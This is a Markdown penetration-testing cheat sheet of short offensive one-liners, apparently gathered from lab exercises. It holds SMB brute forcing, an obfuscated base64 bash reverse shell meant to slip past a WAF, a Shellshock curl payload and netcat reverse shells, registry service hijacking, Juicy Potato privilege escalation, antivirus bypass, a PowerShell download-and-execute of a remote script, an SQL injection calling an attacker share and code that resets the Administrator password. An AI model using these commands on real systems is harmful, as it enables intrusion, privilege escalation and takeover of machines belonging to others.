# Miscellaneous

##### Cisco Type 7 Password Hash Crack
```
http://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html
```

##### Bruteforce SMB
```
cme smb IP -u users.txt -p passwords.txt
```

##### Bruteforce RID
```
cme smb IP -u USER -p PASSWORD --rid-brute
```

##### Dump memory process
```
prodcump.exe -ma PID file.dmp
```

##### Verb Tampering
```
Change HTTP Method to bypass Authentication or check works or not.
```

##### Bypass WAF replacing spaces with ${IFS}
```
echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMQo=|base64${IFS}-d|bash
```

##### Uncompile compiled Python File
```
mv backup backup.pyc
uncompyle6 backup.pyc
```

##### Mime magic bytes
`````
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png (Check Networked)
`````


##### Check CMS
```
wappalyzer http://10.10.10.138/writeup/ | jq
```

##### Scanning magento
```
php magescan.phar scan:all http://IP
```

##### Powershell Runas
```
$username = '<username here>'
$password = '<password here>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("10.10.14.9","1234","-e","cmd.exe") -WorkingDirectory C:\Users\Public

```
##### ShellShock
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.138 4444 >/tmp/f'" http://10.1.10.10/cgi-bin/admin.cgi
```

##### SCP for Windows
```
./pscp.exe -pw '12345' -batch -hostkey 8e:32:52:2e:9c:1d:30:74:2c:56:23:b5:f2:36:d4:87  firefox.exe_191116_172631.dmp  test@10.10.14.4:/home/test/
```

##### SSH Port Forwarding for Windows
```
y:\plink.exe -l userforpf -pw 12345 10.10.14.13 -R 5985:127.0.0.1:5985
```

##### List Services in Registry
```
Get-Childitem HKLM:\SYSTEM\CurrentControlset\Services\wuauserv | format-list
Get-ACL HKLM:\SYSTEM\CurrentControlSet\ | format-list
```
##### Registry Hijacking
```
reg add "HKLM\System\CurrentControlSet\services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "C:\windows\system32\spool\drivers\color\nc.exe 10.10.14.2 9999 -e cmd" /f
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\seclogon" /v ImagePath
```
##### Juicy Potato
```
juicypotato.exe -l 10000 -p "C:\Windows\system32\cmd.exe" -t * -a "/c whoami > text" -c {6d8ff8e0-730d-11d4-bf42-00b0d0118b56}
```
##### Volatility
```
volatility -f file ---profile=profile lsadump
```

##### Bypass Antivirus in Windows
```
git clone https://github.com/trustedsec/nps_payload.git
cd nps_payload/
pip install -r requirements.txt
python nps_payload.py

C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\10.10.14.13\myshare\msbuild_nps.xml

method 2: https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus-part-2/
```

##### Samba Share
```
apt-get install samba
cd /etc/samba/
vi smb.conf
```
```
[Guest]
        comment = Guest
        path = /tmp/share/
        browseable = yes
        read only = yes
        guest ok = yes
```

##### Powershell x64
```
C:\Windows\SysNative\WindowsPowershell\v1.0\Powershell -c "IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.13/Invoke-PowerShellTcp.ps1')
```

##### Running ps1
```
powershell.exe -ExecutionPolicy Bypass -File .\JAWS.ps1 -OutputFilename JAWS-Enum.txt
```

##### SQL Server XP_Dirtree
```
1;EXEC master..xp_dirtree '\\10.10.14.3\foo' --
```

##### Service binary path exploitation with custom C exploit
```
int main()
{
system("net user Administrator HackedByAydin123@");
return 0;
}

i686-w64-mingw32-gcc taskkill.c -o taskkill.exe
```

##### Accesschk
```
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
accesschk.exe -qdws Users C:\Windows\
```





